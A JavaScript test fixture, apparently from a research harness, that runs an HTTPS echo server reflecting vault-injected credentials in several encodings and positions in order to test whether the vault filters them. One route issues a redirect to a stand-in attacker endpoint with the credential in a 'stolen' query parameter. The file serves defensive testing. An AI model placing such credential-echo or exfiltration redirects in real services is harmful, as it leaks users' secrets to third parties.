// TLS echo backend for the E2E harness.
//
// Reflects the credential the vault injected back at the caller in several
// encodings, in the body and in a response header. That makes the response the
// adversarial channel thesis §4.5.2 calls I2a: the backend genuinely received
// the credential, so a redacted caller-visible result proves the vault's
// filtering, not the credential's absence.
//
// `/echo`'s reflection set is deliberately the set the vault's `filtered` mode
// redacts (raw, base64, base64url, hex in both cases, percent-encoded). Classes
// OUTSIDE that set are the Phase 4 response-channel-echo scenario, where a
// surviving encoding is the finding; emitting them from `/echo` would make the
// Phase 3 demonstration cell fail for a reason the cell is not about. So `/echo`
// is FROZEN (D7) — pinned by two harness tests — and the scenario channels live
// on their own paths: /echo/partial, /echo/reason, /redirect-to-attacker.
//
// One §6.2.7 class needs no path of its own: the JSON-escaped echo. This body is
// JSON, so a credential containing a quote or a backslash is escaped on the wire
// by ordinary serialization. That is the point of the finding — the channel is
// not exotic, it appears in any JSON response body.
import { createServer } from "node:https";
import { readFileSync } from "node:fs";

const PORT = Number(process.env.PORT ?? 8443);
const CERT = process.env.CERT_PATH ?? "/pki/echo-https.crt";
const KEY = process.env.KEY_PATH ?? "/pki/echo-https.key";
/** Header the harness sends as a benign control; echoed verbatim, never redacted. */
const MARKER_HEADER = "x-harpoc-marker";

function credentialOf(req) {
  const auth = req.headers["authorization"];
  if (typeof auth === "string") {
    const match = /^(?:Bearer|Basic)\s+(.*)$/i.exec(auth);
    return match ? match[1] : auth;
  }
  const custom = req.headers["x-api-key"];
  return typeof custom === "string" ? custom : "";
}

function encodings(value) {
  const bytes = Buffer.from(value, "utf8");
  return {
    raw: value,
    base64: bytes.toString("base64"),
    base64url: bytes.toString("base64url"),
    hex: bytes.toString("hex"),
    hex_upper: bytes.toString("hex").toUpperCase(),
    percent: encodeURIComponent(value),
  };
}

const server = createServer({ cert: readFileSync(CERT), key: readFileSync(KEY) }, (req, res) => {
  const url = new URL(req.url ?? "/", "https://echo-https");
  const credential = credentialOf(req);
  const marker = req.headers[MARKER_HEADER];

  if (url.pathname === "/health") {
    res.writeHead(200, { "content-type": "text/plain" });
    res.end("ok");
    return;
  }

  // ---- Phase 4 scenario channels -------------------------------------------
  // Separate paths on purpose (D7): `/echo` above is what the Phase 3
  // demonstration cells assert against, so it stays frozen and a cell can never
  // fail for a scenario's reason.

  // §6.2.7 class 2 — partial-credential echoes. Contiguous-pattern matching
  // cannot catch a substring by construction, so this is a pre-registered
  // residual, and measuring it needs an emitter that really sends one.
  if (url.pathname === "/echo/partial") {
    res.writeHead(200, { "content-type": "application/json" });
    res.end(
      JSON.stringify({
        first8: credential.slice(0, 8),
        last4: credential.slice(-4),
        alternating: credential
          .split("")
          .filter((_, i) => i % 2 === 0)
          .join(""),
      }),
    );
    return;
  }

  // §6.2.7 class 3 — out-of-band echo location: the status line itself. The
  // vault's HttpResult has no statusText field, so this channel is structurally
  // absent from the caller-visible result rather than filtered out of it (D9).
  // A reason phrase may not carry CR/LF; the fixture credentials never do.
  if (url.pathname === "/echo/reason") {
    res.writeHead(200, `OK ${credential.replace(/[\r\n]/g, "")}`, {
      "content-type": "application/json",
    });
    res.end(JSON.stringify({ note: "credential is in the status line" }));
    return;
  }

  // Endpoint-authored redirect to the exfiltration sink, with the credential
  // embedded in the target (H2). Two things ride on this: the hop must be
  // refused before the credential is sent anywhere, and the refusal message
  // must not quote the attacker-authored URL back to the model.
  //
  // The port is the host-published address of the `attacker` service — this
  // string is handed to the client, never dialled from inside this container.
  // Kept in step with ATTACKER.port in src/harness/backends.ts, which this
  // fixture cannot import; the harness test pins the two together.
  if (url.pathname === "/redirect-to-attacker") {
    res.writeHead(302, {
      location: `https://localhost:55444/leak?stolen=${encodeURIComponent(credential)}`,
    });
    res.end();
    return;
  }

  const payload = {
    path: url.pathname,
    method: req.method,
    authorization: req.headers["authorization"] ?? null,
    query: Object.fromEntries(url.searchParams),
    marker: typeof marker === "string" ? marker : null,
    credential: credential === "" ? null : encodings(credential),
  };

  const headers = {
    "content-type": "application/json",
    [MARKER_HEADER]: typeof marker === "string" ? marker : "",
  };
  // Header position too: the caller-visible result must be clean in every
  // structural position, not only in the body (review finding H3's lesson).
  if (credential !== "") headers["x-echo-credential"] = credential;

  res.writeHead(200, headers);
  res.end(JSON.stringify(payload));
});

server.listen(PORT, "0.0.0.0", () => {
  process.stdout.write(`echo-https listening on ${String(PORT)}\n`);
});
